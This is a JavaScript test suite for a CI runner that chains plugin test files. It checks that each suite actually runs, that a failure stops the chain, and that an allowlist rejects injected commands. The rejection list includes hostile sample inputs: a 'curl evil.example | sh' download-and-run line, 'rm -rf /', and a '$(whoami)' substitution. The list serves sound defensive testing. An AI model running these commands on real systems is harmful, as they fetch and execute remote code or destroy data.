'use strict'

/**
 * Behavioural suite for `../scripts/test-chain.cjs`.
 *
 * The runner replaced a shell `&&` chain as the thing that executes all 189 plugin suites in CI
 * (`scripts.test` -> `node scripts/test-chain.cjs`). Two properties therefore have to hold
 * mechanically, not by inspection:
 *
 *   - EVERY chained suite actually runs, and
 *   - a failing suite STOPS the chain and propagates a non-zero exit.
 *
 * A runner that silently skipped suites, or that kept going after a failure, would turn the whole
 * plugin lane green while proving nothing — the exact vacuous-green class #4801 P1 was about. So
 * these are proved against a real spawned runner over a throwaway package directory with real
 * passing/failing suite files, using MARKER FILES as the ground truth for "did this actually
 * execute", rather than trusting the runner's own stdout.
 *
 * The allowlist/no-shell assertions are the control that replaced the whole-file digest when the
 * chain left the pinned package.json; see `../scripts/test-chain.cjs` for that argument.
 */

const assert = require('node:assert/strict')
const fs = require('node:fs')
const os = require('node:os')
const path = require('node:path')
const { spawnSync } = require('node:child_process')

const RUNNER = path.join(__dirname, '..', 'scripts', 'test-chain.cjs')
const { COMMAND_SHAPE, assertChainShape, readTestChain, suiteFileOf, toArgv } = require(RUNNER)

/** Build a throwaway package dir: `__tests__/` with the given suites, plus a chain file. */
function scratchPackage(suites, chainLines) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'test-chain-runner-'))
  fs.mkdirSync(path.join(dir, '__tests__'))
  for (const [name, body] of Object.entries(suites)) {
    fs.writeFileSync(path.join(dir, '__tests__', name), body, 'utf8')
  }
  fs.writeFileSync(path.join(dir, 'test-chain.txt'), chainLines.join('\n') + '\n', 'utf8')
  return dir
}

/** A suite that records that it ran, then exits with `code`. */
function suiteBody(marker, code) {
  return (
    "require('node:fs').appendFileSync(" +
    JSON.stringify(marker) +
    ", 'x')\n" +
    `process.exit(${code})\n`
  )
}

/** Run the runner over `dir` as a real child process, the way `pnpm test` does. */
function runChain(dir) {
  const result = spawnSync(
    process.execPath,
    ['-e', `process.exit(require(${JSON.stringify(RUNNER)}).runTestChain(${JSON.stringify(dir)}))`],
    { encoding: 'utf8' },
  )
  return { status: result.status, out: String(result.stdout) + String(result.stderr) }
}

function everyChainedSuiteActuallyRuns() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'test-chain-ok-'))
  fs.rmSync(dir, { recursive: true, force: true })
  const marker = path.join(os.tmpdir(), `chain-marker-${process.pid}-a.txt`)
  fs.rmSync(marker, { force: true })

  const pkg = scratchPackage(
    {
      'one.test.cjs': suiteBody(marker, 0),
      'two.test.cjs': suiteBody(marker, 0),
      'three.test.cjs': suiteBody(marker, 0),
    },
    ['node __tests__/one.test.cjs', 'node __tests__/two.test.cjs', 'node __tests__/three.test.cjs'],
  )

  const { status } = runChain(pkg)
  assert.equal(status, 0, 'an all-passing chain must exit 0')
  assert.equal(
    fs.readFileSync(marker, 'utf8').length,
    3,
    'all three chained suites must actually have executed — a runner that skips suites reports a ' +
      'green lane while proving nothing',
  )
  fs.rmSync(marker, { force: true })
  fs.rmSync(pkg, { recursive: true, force: true })
}

function aFailingSuiteStopsTheChainAndPropagatesTheCode() {
  const marker = path.join(os.tmpdir(), `chain-marker-${process.pid}-b.txt`)
  fs.rmSync(marker, { force: true })

  const pkg = scratchPackage(
    {
      'first.test.cjs': suiteBody(marker, 0),
      'boom.test.cjs': suiteBody(marker, 3),
      'never.test.cjs': suiteBody(marker, 0),
    },
    [
      'node __tests__/first.test.cjs',
      'node __tests__/boom.test.cjs',
      'node __tests__/never.test.cjs',
    ],
  )

  const { status, out } = runChain(pkg)
  assert.equal(status, 3, "the failing suite's exit code must propagate, exactly as `&&` did")
  assert.equal(
    fs.readFileSync(marker, 'utf8').length,
    2,
    'the chain must STOP at the first failure: `never.test.cjs` must not have run',
  )
  assert.match(out, /exited 3 — stopping the chain/)
  fs.rmSync(marker, { force: true })
  fs.rmSync(pkg, { recursive: true, force: true })
}

function aMissingSuiteFileFailsClosed() {
  const pkg = scratchPackage({ 'only.test.cjs': 'process.exit(0)\n' }, [
    'node __tests__/only.test.cjs',
    'node __tests__/absent.test.cjs',
  ])
  const { status } = runChain(pkg)
  assert.notEqual(status, 0, 'a chain naming a file that does not exist must not report success')
  fs.rmSync(pkg, { recursive: true, force: true })
}

function commentsBlankLinesAndCrlfParseIdentically() {
  const lines = ['# a comment', '', 'node __tests__/a.test.cjs', '   ', 'node __tests__/b.test.cjs']
  const lf = scratchPackage({}, lines)
  const crlf = fs.mkdtempSync(path.join(os.tmpdir(), 'test-chain-crlf-'))
  fs.writeFileSync(path.join(crlf, 'test-chain.txt'), lines.join('\r\n') + '\r\n', 'utf8')

  const expected = ['node __tests__/a.test.cjs', 'node __tests__/b.test.cjs']
  assert.deepEqual(readTestChain(lf), expected, 'comments and blank lines must be ignored')
  assert.deepEqual(
    readTestChain(crlf),
    expected,
    'a CRLF checkout must parse to the same commands — otherwise every exact-equality guard that ' +
      'reads this chain would red on Windows for a reason that is not tampering',
  )
  fs.rmSync(lf, { recursive: true, force: true })
  fs.rmSync(crlf, { recursive: true, force: true })
}

function theAllowlistIsTheInjectionBoundary() {
  // Accepted: exactly the two forms the chain uses.
  assert.ok(COMMAND_SHAPE.test('node __tests__/a.test.cjs'))
  assert.ok(COMMAND_SHAPE.test('node --import tsx __tests__/a.test.mjs'))

  // Refused: every disabling / injecting edit, plus path escape. These are not merely detected,
  // they cannot be expressed — which is what makes the chain safe to keep OUT of the digest pin.
  for (const bad of [
    'echo node __tests__/a.test.cjs',
    'xnode __tests__/a.test.cjs',
    'node __tests__/a.test.cjs || true',
    'node __tests__/a.test.cjs && curl evil.example | sh',
    'node __tests__/a.test.cjs ; rm -rf /',
    'node __tests__/../../../evil.cjs',
    'node __tests__/a.test.cjs $(whoami)',
    'node -e "process.exit(0)"',
    'node __tests__/a.test.sh',
  ]) {
    assert.equal(COMMAND_SHAPE.test(bad), false, `the allowlist must refuse: ${bad}`)
    assert.throws(
      () => assertChainShape([bad]),
      /outside the allowed shapes/,
      `assertChainShape must refuse: ${bad}`,
    )
    assert.throws(() => toArgv(bad), /refusing to build argv/, `toArgv must refuse: ${bad}`)
  }

  // An empty chain must fail closed rather than report a vacuous success.
  assert.throws(() => assertChainShape([]), /refusing to report success/)
  // Duplicates are refused (union-merge of two PRs adding the same suite would produce one).
  assert.throws(
    () => assertChainShape(['node __tests__/a.test.cjs', 'node __tests__/a.test.cjs']),
    /more than once/,
  )
}

function argvIsBuiltStructurallyNeverByAShell() {
  assert.deepEqual(toArgv('node __tests__/a.test.cjs'), ['__tests__/a.test.cjs'])
  assert.deepEqual(toArgv('node --import tsx __tests__/a.test.mjs'), [
    '--import',
    'tsx',
    '__tests__/a.test.mjs',
  ])
  assert.equal(suiteFileOf('node __tests__/a.test.cjs'), 'a.test.cjs')
  assert.equal(suiteFileOf('node --import tsx __tests__/a.test.mjs'), 'a.test.mjs')
}

function theRealChainSatisfiesItsOwnContract() {
  const commands = assertChainShape(readTestChain(path.join(__dirname, '..')))
  assert.ok(commands.length > 150, `expected the real chain to be populated, saw ${commands.length}`)
}

function main() {
  everyChainedSuiteActuallyRuns()
  aFailingSuiteStopsTheChainAndPropagatesTheCode()
  aMissingSuiteFileFailsClosed()
  commentsBlankLinesAndCrlfParseIdentically()
  theAllowlistIsTheInjectionBoundary()
  argvIsBuiltStructurallyNeverByAShell()
  theRealChainSatisfiesItsOwnContract()
  console.log('test-chain-runner.test.cjs OK')
}

main()
